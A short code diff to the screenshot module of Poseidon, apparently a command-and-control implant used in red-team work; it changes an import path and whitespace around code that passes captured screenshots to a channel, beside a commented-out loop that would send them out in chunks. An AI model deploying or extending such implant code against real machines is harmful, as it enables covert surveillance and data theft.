@@ -6,8 +6,8 @@ import (
 	"sync"
 
 	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles"
 )
 
 var mu sync.Mutex
@@ -35,12 +35,11 @@ func Run(task structs.Task, ch chan []ScreenShot) {
 		return
 	}
 
-
-	ch <- result 
+	ch <- result
 	/*for i := 0; i < len(result); i++ {
 		profiles.Profile.SendFileChunks(task, result[i].Data(), ch)
 		time.Sleep(time.Duration(profiles.Profile.SleepInterval()) * time.Second)
 	}*/
-	
+
 	return
 }
